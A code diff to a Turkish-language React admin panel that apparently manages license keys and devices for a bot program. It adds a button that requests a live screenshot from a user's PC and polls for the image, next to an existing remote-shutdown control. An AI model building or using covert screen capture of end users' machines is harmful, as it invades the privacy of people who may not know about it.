@@ -59,6 +59,8 @@ export default function Admin() {
   const [cihazlar, setCihazlar] = useState([]);
   const [limitDeger, setLimitDeger] = useState(16);
   const [cihazDeger, setCihazDeger] = useState(1);
+  const [ekranResim, setEkranResim] = useState(null);
+  const [ekranBekle, setEkranBekle] = useState(false);
   const [mesaj, setMesaj] = useState('');
 
   const yukle = useCallback(async (q = '') => {
@@ -98,6 +100,33 @@ export default function Admin() {
     await fetch('/api/k34/login', { method: 'DELETE' });
     setGirisli(false);
     setListe([]);
+  }
+
+  // Bir cihazdan anlik ekran goruntusu iste (bot >=2.7.2). Komut birakip
+  // /api/k34/ekran'i kisa araliklarla yoklar; gelince gosterir.
+  async function ekranAl(id, hwid) {
+    setEkranResim(null);
+    setEkranBekle(true);
+    await fetch('/api/k34/keys/' + id, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ islem: 'ekranIste', hwid }),
+    });
+    const bas = Date.now();
+    const dene = async () => {
+      try {
+        const r = await fetch('/api/k34/ekran?id=' + id + '&hwid=' + encodeURIComponent(hwid), { cache: 'no-store' });
+        const c = await r.json();
+        if (c.hazir && c.resim) { setEkranResim(c.resim); setEkranBekle(false); return; }
+      } catch {}
+      if (Date.now() - bas > 40000) {
+        setEkranBekle(false);
+        bildir('Ekran görüntüsü gelmedi (PC açık mı? Bot 2.7.2 mi?)');
+        return;
+      }
+      setTimeout(dene, 2500);
+    };
+    setTimeout(dene, 2500);
   }
 
   async function uret(e) {
@@ -186,6 +215,31 @@ export default function Admin() {
   /* -------------------------------------------------------------- panel */
   return (
     <div style={{ padding: '26px 0 70px' }}>
+      {(ekranBekle || ekranResim) && (
+        <div
+          onClick={() => { setEkranResim(null); setEkranBekle(false); }}
+          style={{
+            position: 'fixed', inset: 0, background: 'rgba(0,0,0,.82)', zIndex: 1000,
+            display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 16,
+          }}
+        >
+          <div onClick={(e) => e.stopPropagation()} style={{ textAlign: 'center', maxWidth: '95vw' }}>
+            {ekranResim ? (
+              <img src={ekranResim} alt="ekran" style={{ maxWidth: '92vw', maxHeight: '82vh', borderRadius: 8, border: '1px solid #333' }} />
+            ) : (
+              <div style={{ color: 'var(--beyaz)', fontSize: 15, padding: 40 }}>
+                📸 Ekran görüntüsü alınıyor… <br />
+                <span style={{ fontSize: 12.5, color: 'var(--gri2)' }}>Bot en geç ~30 sn içinde gönderir</span>
+              </div>
+            )}
+            <div style={{ marginTop: 12 }}>
+              <button onClick={() => { setEkranResim(null); setEkranBekle(false); }} style={{ ...S.btn, ...S.btnHayalet }}>
+                Kapat
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
       <div style={S.sar}>
         <header style={S.ust}>
           <img src="/logo.png" alt="" width="40" height="40" style={{ borderRadius: 12 }} />
@@ -399,11 +453,18 @@ export default function Admin() {
                                   </button>
                                 )}
                                 <button
+                                  onClick={() => ekranAl(l.id, c.hwid)}
+                                  style={{ ...S.mini, marginLeft: 'auto' }}
+                                  title="Bu PC'den anlık ekran görüntüsü al"
+                                >
+                                  📸 Ekran
+                                </button>
+                                <button
                                   onClick={() => {
                                     if (confirm('Bu bilgisayar UZAKTAN kapatılsın mı?'))
                                       islem(l.id, { islem: 'uzaktanKapat', hwid: c.hwid, mod: 'pc' });
                                   }}
-                                  style={{ ...S.mini, marginLeft: 'auto' }}
+                                  style={S.mini}
                                   title="Bu PC'yi uzaktan kapat (bot ~30 sn içinde uygular)"
                                 >
                                   🖥 Kapat
